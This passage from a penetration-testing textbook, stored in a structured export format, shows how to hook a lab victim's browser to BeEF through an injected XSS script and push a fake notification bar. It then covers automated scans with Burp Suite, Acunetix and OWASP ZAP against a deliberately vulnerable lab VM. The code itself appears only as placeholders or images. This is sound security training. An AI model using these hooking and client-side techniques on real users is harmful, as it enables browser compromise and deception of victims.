    using the **Browser Exploitation Framework** (**BeEF**).
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting XSS – hooking vulnerable page visitors to BeEF
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: BeEF is a security auditing tool used by penetration testers to assess the security
    posture, and discover vulnerabilities, of systems and networks. It allows you
    to hook a client browser and exploit it. Hooking is the process of getting a victim
    to click on a web page that contains JavaScript code. The JavaScript code is then
    processed by the victim's web browser and binds the browser to the BeEF server
    on Kali Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'For this exercise, we''ll be using the following topology:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/6189fb95-6088-4d4d-9b43-31783dfee3a4.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Let''s start using BeEF to exploit XSS vulnerabilities:'
  prefs: []
  type: TYPE_NORMAL
- en: 'To open BeEF, go to **Applications** | **08 – Exploitation Tools** | **beef
    xss framework**. The BeEF service will start and display the following details
    to access the BeEF interface:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/18de4963-6b2f-4483-95fe-b19301d2ca72.png)'
  prefs: []
  type: TYPE_IMG
- en: WEB UI and hook URLs are important. The JavaScript hook is usually embedded
    into a web page that is sent to the victim. Once accessed, the JavaScript will
    execute on the victim's browser and create a hook to the BeEF server. The IP address
    used in the hook script is the IP address of the BeEF server. In our lab, it is
    the Kali Linux (attacker) machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'The web browser will automatically open to the BeEF login portal. If it does
    not open, use `http://127.0.0.1:3000/ui/panel`:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/ee2553fa-1934-4107-80cf-cae16a0952fa.png)'
  prefs: []
  type: TYPE_IMG
- en: The username is `beef` and you will have set the password when initially starting
    BeEF.
  prefs: []
  type: TYPE_NORMAL
- en: 'Start the Apache web service on Kali Linux:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: Edit the web page located in the web server directory.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'Insert the code within the head of the HTML page as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/4aed4a96-864a-469c-bba6-f0438bfcc84c.png)'
  prefs: []
  type: TYPE_IMG
- en: The IP address belongs to the Kali Linux machine that is running the BeEF server.
  prefs: []
  type: TYPE_NORMAL
- en: 'On your Windows machine, open the web browser and insert the IP address of
    the Kali Linux machine:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/312443b0-41b0-49d5-be63-40b968c9eda9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Head back over to your Kali Linux machine. You now have a hooked browser. Click
    on the hooked browser:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/fc935547-fba6-4dfa-a583-e6354feffcb7.png)'
  prefs: []
  type: TYPE_IMG
- en: Click on the `Commands` tab. Here, you'll be able to execute actions on the
    victim's web browser. Let's display a notification on the client's side.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click on the Commands tab | Social Engineering | Fake Notification Bar:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/fceefd0d-19bd-4b9a-a606-c93b21655624.png)'
  prefs: []
  type: TYPE_IMG
- en: The column on the far right will display a description of the attack. When you're
    ready, click on Execute to launch it.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, head on over to the Windows machine. You''ll see that a fake notification
    bar appears in the web browser:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/728450c8-bf0b-486c-8094-8941ebc67a22.png)'
  prefs: []
  type: TYPE_IMG
- en: BeEF allows you to perform client-side attacks on the victim's browser interface.
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we have covered various methods and techniques used to discover
    XSS vulnerabilities on a target, and we have performed XSS exploitation using
    BeEF. In the next section, we'll perform automatic web vulnerability scanning.
  prefs: []
  type: TYPE_NORMAL
- en: Discovering vulnerabilities automatically
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we will take a look at using tools to help us automatically
    discover web applications and server vulnerabilities. Burp Suite, Acunetix, and
    OWASP ZAP will be used to perform vulnerability scanning.
  prefs: []
  type: TYPE_NORMAL
- en: Burp Suite
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In [Chapter 7](075f58ca-ff2a-48c7-9b90-17ddd4e408c9.xhtml), *Working with Vulnerability
    Scanners*, we outlined the benefits and functionality of using Burp Suite. In
    this section, we will further demonstrate how to perform automated vulnerability
    discovery using this tool.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can use Burp Suite to perform automated scans on specific pages or websites.
    Before we start, ensure that you have configured the following settings:'
  prefs: []
  type: TYPE_NORMAL
- en: Configure the web browser on the attacker machine (Kali Linux) to work with
    Burp Suite Proxy. If you are having difficulty with this task, please revisit
    [Chapter 7](075f58ca-ff2a-48c7-9b90-17ddd4e408c9.xhtml), *Working with Vulnerability
    Scanners*.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Ensure that you turn on the OWASP BWA virtual machine and capture its IP address.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Once these configurations are in place, we can begin by taking the following
    steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Use the web browser on your Kali Linux machine to navigate to the **DVWA** within
    the OWASP BWA virtual machine.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Click on **SQL Injection** as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/dd2248ee-734a-45ce-9063-29fe5a322ba2.png)'
  prefs: []
  type: TYPE_IMG
- en: Open Burp Suite and ensure that **Intercept** is on.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'On the DVWA web page, click the **Submit** button to send an HTTP request to
    the server:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/0a900c70-50af-4042-95aa-cf9952f9ec1d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'In Burp Suite, you should be able to see the HTTP request. Right-click anywhere
    in the context window and select **Do an active scan**:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/8370b5cf-c944-47c5-8467-f236801b1ab5.png)'
  prefs: []
  type: TYPE_IMG
- en: This will allow Burp Suite to perform an automated scan on the target web page
    to discover any web vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following is an example of the results after completing a scan using Burp
    Suite:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/edf2e386-d418-4b5c-963c-a6c202b7f049.png)'
  prefs: []
  type: TYPE_IMG
- en: Selecting each issue found will provide you with a breakdown of the specific
    vulnerability.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, we will learn how to use Acunetix to discover web vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Acunetix
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Acunetix is one of the most popular and recognized web application vulnerability
    scanners in the industry. It's currently one of the leading vulnerability scanners
    used among Fortune 500 companies. Acunetix is designed to deliver both advanced
    XSS and SQL injection attacks by scanning a target website or web server.
  prefs: []
  type: TYPE_NORMAL
- en: 'To start using Acunetix, please observe the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Go to [https://www.acunetix.com/vulnerability-scanner/download/](https://www.acunetix.com/vulnerability-scanner/download/)
    and register for a trial version. Acunetix is a commercial product, but we are
    able to acquire a trial version for our exercise.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'After completing the registration, you''ll be presented with the following
    screen:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/999655ad-e166-4d03-85b6-894acf563d4d.png)'
  prefs: []
  type: TYPE_IMG
- en: Download the Linux version as we'll be using it on our attacker machine, Kali
    Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'After the `acunetix_trial.sh` file has been downloaded, use the `chmod +x acunetix_trial.sh`
    command to apply executable privileges to your local user account. To begin installation,
    use the `./acunetix_trial.sh` command as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/1c66772c-aefe-47bf-a663-6fa7a54bffe2.png)'
  prefs: []
  type: TYPE_IMG
- en: On the command-line interface, read through and accept the **End User License
    Agreement** (**EULA**).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Open your web browser in Kali Linux and enter the following address, `https://kali:13443/`,
    to access the Acunetix user interface. Log in using the user account created during
    the setup process:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/168e73b6-2d46-47a3-ab0d-be81b69ab400.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To begin a new scan, click on **Create new Target** or **Add Target**, as shown
    here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/11b79283-7d0f-44d3-9ed2-544185c8ae28.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The **Add Target** pop-up window will open, which allows you to specify a target:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/f7240a89-ff37-42d9-8731-c9ca8faed639.png)'
  prefs: []
  type: TYPE_IMG
- en: 'After adding a target, you''ll be presented with options for customizing your
    scan:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/f4b4bd21-dab9-4f71-951c-9315ec2ee22a.png)'
  prefs: []
  type: TYPE_IMG
- en: For now, we will leave all the options with their default settings.
  prefs: []
  type: TYPE_NORMAL
- en: 'Specify the type of scan and reporting options:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/ee4c16f7-db4f-4ead-a9f4-7e8cadf04b1d.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Acunetix allows you to generate the following types of report for your business
    needs:'
  prefs: []
  type: TYPE_NORMAL
- en: Affected items
  prefs:
  - PREF_UL
  - PREF_UL
  type: TYPE_NORMAL
- en: Developer
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Executive
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Quick
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Compliance reports
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: CWE 2011
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: HIPAA
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: ISO 27001
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: NIST SP800 53
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP Top 10 2013
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP Top 10 2017
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: PCI SDD 3.2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Sarbanes Oxley
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: STIG DISA
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: WASC Threat Classification
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: When you're ready, start the scan on the target.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Once the scan is complete, a summary is provided on the main Acunetix dashboard,
    as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/15232b4a-ba70-4231-a066-79052ea0ccd8.png)'
  prefs: []
  type: TYPE_IMG
- en: You can quickly see the duration of the scan and any high-risk vulnerabilities
    found.
  prefs: []
  type: TYPE_NORMAL
- en: 'To see a detailed list of vulnerabilities found, click on the **Vulnerabilities**
    tab and select one of the web vulnerabilities:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/3aa6b696-150e-41de-bb4e-576aea9dd2cf.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To create a report, click on **Generate Report**. The reporting wizard will
    allow you to specify the type of report that is most suitable based on the objective
    of the web application penetration test. Once the report has been generated, you
    can download the file onto your desktop. The following shows a PDF version of
    the executive report:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0121a183-9f36-493f-8147-55977b2f0e28.png)'
  prefs: []
  type: TYPE_IMG
- en: Acunetix is definitely a must-have tool as part of your penetration testing
    arsenal. It will allow you to quickly perform black box testing on any web applications
    and present findings in an easy-to-read and understandable report.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, we will learn how to use OWASP ZAP to perform web vulnerability
    assessments.
  prefs: []
  type: TYPE_NORMAL
- en: OWASP ZAP
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The OWASP **Zed Attack Proxy** (**ZAP**) project was created by OWASP as a free
    security tool for discovering vulnerabilities on web servers and applications
    with a simple and easy-to-use interface.
  prefs: []
  type: TYPE_NORMAL
- en: OWASP ZAP is pre-installed in Kali Linux. To start, let's perform a web vulnerability
    scan on our target OWASP BWA virtual machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'To start with using OWASP ZAP, perform the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Open OWASP ZAP and then navigate to Applications | 03 - Web Application Analysis
    | OWASP-ZAP. On the interface, click on Automated Scan, as shown here:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/2061bc20-6840-422d-a5ab-51479a9db37a.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Enter the IP address of the OWASP BWA virtual machine and click Attack to begin
    the security scan:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/56e0d854-2bfc-443e-ae4c-24fd1c2c81c6.png)'
  prefs: []
  type: TYPE_IMG
- en: 'During the scanning phase, OWASP ZAP will perform spidering on the target.
    **Spidering** is a technique in which the web security scanner detects hidden
    directories and attempts to access them (crawling):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a836afd6-7964-41d5-8651-916ef2632caf.png)'
  prefs: []
  type: TYPE_IMG
- en: 'When the scan is complete, click on the Alerts tab to see all web-based vulnerabilities
    found and the locations of each on the target:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/8ba840a6-1592-4fbc-a5c7-5971d905df1e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Upon selecting a vulnerability, OWASP will display both the HTTP head and body
    when they are returned from the target server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/9eb1000e-c212-4d9b-9706-8f2a5378778f.png)'
  prefs: []
  type: TYPE_IMG
- en: If you look closely at the preceding screenshot, you will see that OWASP ZAP
    has highlighted the affected area of the web coding.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once a security scan is complete, you can create and export a report. To do
    this, click on Report | Generate HTML Report. The application will allow you to
    save the report to your desktop. The following is a sample report created using
    OWASP ZAP:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/7f01fa60-3283-4f1f-9f7b-ec0d599cd970.png)'
  prefs: []
  type: TYPE_IMG
- en: Additionally, OWASP ZAP allows you to generate reports in multiple formats based
    on your requirements. Be sure to explore the other functions of this amazing tool.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Having completed this chapter, you are now able to perform web application penetration
    testing, bypass login using SQL injection attacks, find tables in databases and
    retrieve user credentials, perform various types of XSS attacks on web applications,
    and successfully launch client-side attacks using BeEF.
  prefs: []
  type: TYPE_NORMAL
- en: I hope this chapter will prove helpful to your studies and career. In the next
    chapter, you'll be learning about penetration testing best practices.
  prefs: []
  type: TYPE_NORMAL
- en: Questions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are some questions based on the topics we have covered in this
    chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: What SQL statement is used to specify a table within a database?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How do you close a statement in SQL?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How do you add a new record in a database?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: What tool can perform a client-side attack?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Further reading
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: '**XSS**: [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**SQL injection**: [https://www.owasp.org/index.php/SQL_Injection](https://www.owasp.org/index.php/SQL_Injection)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
